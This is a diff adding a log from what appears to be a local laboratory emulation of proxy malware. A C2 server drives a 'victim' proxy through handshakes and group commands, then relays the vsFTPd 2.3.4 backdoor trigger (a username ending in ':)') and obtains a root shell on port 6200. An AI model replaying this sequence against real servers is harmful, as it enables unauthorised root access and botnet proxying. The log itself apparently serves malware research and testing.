@@ -1,0 +1,52 @@
+21:50:14 [VICTIM] Generated one RSALocal key pair for GW and C2 sessions
+21:50:14 [VICTIM] Starting victim proxy (Ctrl+C to stop)
+21:50:14 [VICTIM] Connecting to group 0 server 127.0.0.1:18443
+21:50:14 [VICTIM] RSA/RC4 handshake complete with group 0
+21:50:14 [VICTIM] Victim -> server HELO
+  HELO
+    VER: 02 00 00 00
+    UUID: cf 4e 87 11 ae 74 e3 26 64 86 be c4 0a 58 13 80
+    PORT: 75 30 ('u0')
+    GROUP: 00 00
+    LDGROUP: e8 03
+    LID: 01 00 00 00 00 00 00 00
+    CT: 01 00 00 00
+    FB: 
+21:50:14 [VICTIM] GW -> Victim SET
+21:50:14 [VICTIM] Accepted signed SET LID=2 with groups=[0, 1]
+21:50:14 [VICTIM] GW -> Victim SETGROUP
+21:50:14 [VICTIM] SETGROUP selected group 1; closing gateway session
+21:50:15 [VICTIM] Connecting to group 1 server 127.0.0.1:19443
+21:50:15 [VICTIM] RSA/RC4 handshake complete with group 1
+21:50:15 [VICTIM] Victim -> server HELO
+  HELO
+    VER: 02 00 00 00
+    UUID: cf 4e 87 11 ae 74 e3 26 64 86 be c4 0a 58 13 80
+    PORT: 75 30 ('u0')
+    GROUP: 01 00
+    LDGROUP: e8 03
+    LID: 02 00 00 00 00 00 00 00
+    CT: 01 00 00 00
+21:50:15 [VICTIM] C2 -> Victim SET
+21:50:15 [VICTIM] Accepted signed SET LID=3 with groups=[0, 1]
+21:50:15 [VICTIM] C2 -> Victim PING
+21:50:15 [VICTIM] C2 -> PING; Victim -> PONG
+21:50:15 [VICTIM] C2 -> Victim CONN
+21:50:15 [VICTIM] Opened CH=1 Victim:61366 -> 127.0.0.1:2121
+21:50:15 [VICTIM] Target -> RECV CH=1 DT=b'220 (vsFTPd 2.3.4)\r\n' [32 32 30 20 28 76 73 46 54 50 64 20 32 2e 33 2e 34 29 0d 0a]
+21:50:15 [VICTIM] C2 -> Victim SEND
+21:50:15 [VICTIM] SEND CH=1 -> target b'USER lab:)\r\n' [55 53 45 52 20 6c 61 62 3a 29 0d 0a]
+21:50:15 [VICTIM] Target -> RECV CH=1 DT=b'331 Please specify the password.\r\n' [33 33 31 20 50 6c 65 61 73 65 20 73 70 65 63 69 66 79 20 74 68 65 20 70 61 73 73 77 6f 72 64 2e 0d 0a]
+21:50:15 [VICTIM] C2 -> Victim SEND
+21:50:15 [VICTIM] SEND CH=1 -> target b'PASS lab\r\n' [50 41 53 53 20 6c 61 62 0d 0a]
+21:50:15 [VICTIM] Target -> RECV CH=1 DT=b'530 Login incorrect.\r\n' [35 33 30 20 4c 6f 67 69 6e 20 69 6e 63 6f 72 72 65 63 74 2e 0d 0a]
+21:50:15 [VICTIM] C2 -> Victim CONN
+21:50:15 [VICTIM] Opened CH=2 Victim:61367 -> 127.0.0.1:6200
+21:50:15 [VICTIM] C2 -> Victim SEND
+21:50:15 [VICTIM] SEND CH=2 -> target b'id\n' [69 64 0a]
+21:50:15 [VICTIM] Target -> RECV CH=2 DT=b'uid=0(root) gid=0(root) groups=0(root)\n' [75 69 64 3d 30 28 72 6f 6f 74 29 20 67 69 64 3d 30 28 72 6f 6f 74 29 20 67 72 6f 75 70 73 3d 30 28 72 6f 6f 74 29 0a]
+21:50:15 [VICTIM] C2 -> Victim SHUT
+21:50:15 [VICTIM] Closed CH=2 and sent DISC
+21:50:15 [VICTIM] C2 -> Victim SHUT
+21:50:15 [VICTIM] Closed CH=1 and sent DISC
+21:50:15 [VICTIM] All proxy channels closed; ending finite laboratory session
